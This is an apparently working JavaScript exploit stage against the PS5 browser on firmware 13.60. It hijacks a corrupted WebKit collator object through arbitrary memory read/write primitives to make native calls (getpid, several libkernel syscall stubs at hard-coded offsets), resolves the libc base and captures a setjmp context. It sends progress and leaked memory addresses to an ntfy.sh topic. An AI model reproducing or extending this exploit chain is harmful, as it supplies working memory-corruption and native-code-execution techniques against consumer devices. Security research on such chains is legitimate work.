(function(){
  "use strict";

  var meta=window.__PS5_STAGEB_META||{};
  var rid=String(meta.rid||"unknown");
  var TOPIC=String(meta.topic||"");
  var ctx=window.__PS5_CTX;

  function relay(title,msg){
    if(!TOPIC) return;
    var base="https://ntfy.sh/"+encodeURIComponent(TOPIC);
    var u=base+"/publish?title="+encodeURIComponent(title)+
      "&message="+encodeURIComponent(msg)+"&tags=computer&_="+Date.now();

    try{
      if(navigator.sendBeacon)
        navigator.sendBeacon(
          base+"?title="+encodeURIComponent(title)+"&tags=computer&_="+Date.now(),
          String(msg)
        );
    }catch(_){}

    try{
      fetch(u,{method:"GET",mode:"no-cors",cache:"no-store",keepalive:true})
        .catch(function(){});
    }catch(_){}

    try{
      if(!window.__stageBImgs) window.__stageBImgs=[];
      var im=new Image();
      window.__stageBImgs.push(im);
      im.src=u;
    }catch(_){}
  }

  function report(phase,extra){
    var msg="advanced_stage=B\nrun="+rid+"\nfirmware=13.60\nphase="+phase+
      (extra?"\n"+extra:"");
    try{localStorage.setItem("ps5-1360-last-stageb",msg);}catch(_){}
    relay("PS5 13.60 ADV-B "+rid,msg);
  }

  function low48Bytes(value){
    var out=[];
    var v=Number(value);
    var hi=Math.floor(v/0x100000000);
    var lo=v-hi*0x100000000;
    out.push(lo&0xff);
    out.push(Math.floor(lo/0x100)&0xff);
    out.push(Math.floor(lo/0x10000)&0xff);
    out.push(Math.floor(lo/0x1000000)&0xff);
    out.push(hi&0xff);
    out.push(Math.floor(hi/0x100)&0xff);
    return out;
  }

  function writeQwordToArena(off,value){
    var A=ctx.arena;
    var v=Number(value);
    var hi=Math.floor(v/0x100000000);
    var lo=v-hi*0x100000000;
    A[off+0]=lo&0xff;
    A[off+1]=Math.floor(lo/0x100)&0xff;
    A[off+2]=Math.floor(lo/0x10000)&0xff;
    A[off+3]=Math.floor(lo/0x1000000)&0xff;
    A[off+4]=hi&0xff;
    A[off+5]=Math.floor(hi/0x100)&0xff;
    A[off+6]=0;
    A[off+7]=0;
  }

  if(!ctx){
    report("DIRECT_GETPID_ABORT","reason=no-ps5-ctx");
    return;
  }

  var target=0;
  try{
    target=ctx.kernelBaseCandidates && ctx.kernelBaseCandidates.getpidPtr
      ? Number(ctx.kernelBaseCandidates.getpidPtr) : 0;
  }catch(_){target=0;}

  report("DIRECT_GETPID_START",
    "ctx=1\ngetpidPtr="+String(target)+
    "\nwebkitBase="+String(ctx.webkitBase||0)+
    "\nlibkernelBase="+String(ctx.libkernelBase||0));

  if(!(target>0x800000000 && target<0x900000000)){
    report("DIRECT_GETPID_FAIL","reason=invalid-getpid-pointer\ngetpidPtr="+String(target));
    return;
  }

  if(!ctx.arena || typeof ctx.aim!=="function" || typeof ctx.compare!=="function"
     || !ctx.collatorSaved || !ctx.collatorCell || !ctx.fakeCollator){
    report("DIRECT_GETPID_FAIL","reason=incomplete-handoff-context");
    return;
  }

  var field=null;
  try{
    // Same natural native-call layout already proven by the Userland
    // notification: rdi=0, rcx=0, callee=getpid.
    writeQwordToArena(0x100+0x48,0);
    writeQwordToArena(0x100+0x60,0);
    writeQwordToArena(0x100+0xE0,target);

    field=ctx.aim(Number(ctx.collatorCell)+0x18);
    var fp=low48Bytes(ctx.fakeCollator);
    for(var i=0;i<6;i++) field[i]=fp[i];
    field[6]=0; field[7]=0;

    var result;
    try{
      result=ctx.compare("");
    }finally{
      var restore=ctx.aim(Number(ctx.collatorCell)+0x18);
      for(var j=0;j<ctx.collatorSaved.length;j++)
        restore[j]=ctx.collatorSaved[j];
    }

    var n=Number(result);
    if(Number.isFinite(n) && Math.floor(n)===n && n>0 && n<1000000){
      report("DIRECT_GETPID_PASS",
        "pid="+String(n)+"\ngetpidPtr="+String(target)+"\nmode=NATURAL_NATIVE_CALL");
      var st=document.getElementById("status");
      if(st) st.textContent="DIRECT GETPID PASS — pid="+String(n)+" — running safe capability census…";

      // Stage C: only no-argument, side-effect-free libkernel syscall wrappers.
      // RVA values come from X1NON's PS5 13.60 syscallStubs table.
      var SAFE_STUBS=[
        {name:"getppid", num:39,  rva:0x1b760},
        {name:"getuid",  num:24,  rva:0x1c9b0},
        {name:"geteuid", num:25,  rva:0x1bd20},
        {name:"getegid", num:43,  rva:0x1d3c0},
        {name:"getgid",  num:47,  rva:0x1b1e0},
        {name:"is_in_sandbox", num:585, rva:0x1d040},
        {name:"sched_yield", num:331, rva:0x1bd80}
      ];

      function callNoArgStub(entry){
        var ptr=Number(ctx.libkernelBase||0)+entry.rva;
        if(!(ptr>0x800000000 && ptr<0x900000000))
          throw new Error("bad-stub-pointer-"+entry.name);

        writeQwordToArena(0x100+0x48,0);
        writeQwordToArena(0x100+0x60,0);
        writeQwordToArena(0x100+0xE0,ptr);

        var f=ctx.aim(Number(ctx.collatorCell)+0x18);
        var b=low48Bytes(ctx.fakeCollator);
        for(var x=0;x<6;x++) f[x]=b[x];
        f[6]=0; f[7]=0;

        var rv;
        try{
          rv=ctx.compare("");
        }finally{
          var rr=ctx.aim(Number(ctx.collatorCell)+0x18);
          for(var y=0;y<ctx.collatorSaved.length;y++) rr[y]=ctx.collatorSaved[y];
        }
        return {name:entry.name,num:entry.num,rva:entry.rva,ptr:ptr,value:Number(rv)};
      }

      var results=[];
      var pos=0;

      function nextSafeProbe(){
        if(pos>=SAFE_STUBS.length){
          var parts=[];
          for(var z=0;z<results.length;z++)
            parts.push(results[z].name+"="+String(results[z].value));

          var sandbox=results.filter(function(x){return x.name==="is_in_sandbox";})[0];
          report("CAPABILITY_CENSUS_PASS",
            "pid="+String(n)+
            "\n"+parts.join("\n")+
            "\nsandbox_value="+String(sandbox?sandbox.value:"unknown")+
            "\nmode=NATURAL_NATIVE_CALL");

          var st3=document.getElementById("status");
          if(st3) st3.textContent="STAGE C PASS — "+parts.join(" · ")+" — resolving libc/setjmp…";

          setTimeout(function(){
            // Stage D (0.6.6): scanless libc resolution + setjmp context capture.
            // No gadget execution, no text scan, no kernel/UAF activity.
            var WK_MEMSET_IMPORT=0x03350850;
            var LC_MEMSET=0x00014700;
            var LC_SETJMP=0x0005D990;
            var LC_LONGJMP=0x0005D9E0;
            var BUF_OFF=0x1400;
            var BUF_LEN=0x100;

            function readPtrAt(addr){
              var v=ctx.aim(Number(addr));
              var lo=(v[0]&0xff) +
                     (v[1]&0xff)*0x100 +
                     (v[2]&0xff)*0x10000 +
                     (v[3]&0xff)*0x1000000;
              var hi=(v[4]&0xff) + (v[5]&0xff)*0x100;
              return hi*0x100000000 + (lo>>>0);
            }

            function readArenaQword(off){
              var A=ctx.arena;
              var lo=(A[off]&0xff) +
                     (A[off+1]&0xff)*0x100 +
                     (A[off+2]&0xff)*0x10000 +
                     (A[off+3]&0xff)*0x1000000;
              var hi=(A[off+4]&0xff) + (A[off+5]&0xff)*0x100;
              return hi*0x100000000 + (lo>>>0);
            }

            function naturalCall1(target1,arg0){
              writeQwordToArena(0x100+0x48,arg0);
              writeQwordToArena(0x100+0x60,0);
              writeQwordToArena(0x100+0xE0,target1);

              var f2=ctx.aim(Number(ctx.collatorCell)+0x18);
              var b2=low48Bytes(ctx.fakeCollator);
              for(var q=0;q<6;q++) f2[q]=b2[q];
              f2[6]=0; f2[7]=0;

              var rv2;
              try{
                rv2=ctx.compare("");
              }finally{
                var rr2=ctx.aim(Number(ctx.collatorCell)+0x18);
                for(var w=0;w<ctx.collatorSaved.length;w++)
                  rr2[w]=ctx.collatorSaved[w];
              }
              return Number(rv2);
            }

            try{
              var memsetPtr=readPtrAt(Number(ctx.webkitBase)+WK_MEMSET_IMPORT);
              var libcBase=memsetPtr-LC_MEMSET;
              var setjmpPtr=libcBase+LC_SETJMP;
              var longjmpPtr=libcBase+LC_LONGJMP;

              var plausible=
                memsetPtr>0x800000000 && memsetPtr<0x900000000 &&
                libcBase>0x800000000 && libcBase<0x900000000 &&
                (libcBase%0x4000)===0;

              report("LIBC_RESOLVE",
                "memset_import_ptr="+String(memsetPtr)+
                "\nlibcBase="+String(libcBase)+
                "\nsetjmpPtr="+String(setjmpPtr)+
                "\nlongjmpPtr="+String(longjmpPtr)+
                "\nplausible="+(plausible?"1":"0"));

              if(!plausible){
                report("SETJMP_PROBE_FAIL","reason=libc-base-not-plausible");
                return;
              }

              for(var z0=0;z0<BUF_LEN;z0++) ctx.arena[BUF_OFF+z0]=0;

              var jmpBuf=Number(ctx.arenaBacking)+BUF_OFF;
              var rv=naturalCall1(setjmpPtr,jmpBuf);

              var words=[];
              var nonzero=0;
              var canonical=0;
              for(var qo=0;qo<0x80;qo+=8){
                var qv=readArenaQword(BUF_OFF+qo);
                if(qv!==0) nonzero++;
                if(qv>0x100000000 && qv<0x1000000000000) canonical++;
                words.push("q"+(qo/8)+"=0x"+Math.floor(qv).toString(16));
              }

              var pass=(rv===0 && nonzero>=2);
              var details=
                "return="+String(rv)+
                "\njmpBuf="+String(jmpBuf)+
                "\nnonzero_qwords="+nonzero+
                "\ncanonical_qwords="+canonical+
                "\n"+words.join("\n");

              try{
                localStorage.setItem("ps5-1360-setjmp-probe",
                  "libcBase="+libcBase+"\nsetjmpPtr="+setjmpPtr+
                  "\nlongjmpPtr="+longjmpPtr+"\n"+details);
              }catch(_){}

              report(pass?"SETJMP_PROBE_PASS":"SETJMP_PROBE_FAIL",details);

              var st4=document.getElementById("status");
              if(st4) st4.textContent=pass
                ? "STAGE D PASS — libc resolved, setjmp context captured safely."
                : "STAGE D FAIL — setjmp probe did not produce a valid context.";
            }catch(e){
              report("SETJMP_PROBE_FAIL",
                "reason=exception\nerror="+String(e&&e.message||e).slice(0,220));
            }
          },500);

          return;
        }

        var ent=SAFE_STUBS[pos++];
        try{
          var r=callNoArgStub(ent);
          results.push(r);
          report("CAPABILITY_PROBE",
            "name="+r.name+"\nnum="+r.num+"\nrva=0x"+r.rva.toString(16)+
            "\nvalue="+String(r.value));
        }catch(e){
          results.push({name:ent.name,num:ent.num,rva:ent.rva,value:"EX"});
          report("CAPABILITY_PROBE_FAIL",
            "name="+ent.name+"\nnum="+ent.num+
            "\nerror="+String(e&&e.message||e).slice(0,180));
        }

        setTimeout(nextSafeProbe,180);
      }

      setTimeout(nextSafeProbe,350);
    }else{
      report("DIRECT_GETPID_FAIL",
        "reason=unexpected-return\nreturn="+String(result)+
        "\ngetpidPtr="+String(target));
    }
  }catch(e){
    try{
      if(field && ctx.collatorSaved){
        var r=ctx.aim(Number(ctx.collatorCell)+0x18);
        for(var k=0;k<ctx.collatorSaved.length;k++) r[k]=ctx.collatorSaved[k];
      }
    }catch(_){}

    report("DIRECT_GETPID_FAIL",
      "reason=exception\nerror="+String(e&&e.message||e).slice(0,220)+
      "\ngetpidPtr="+String(target));
  }
}());
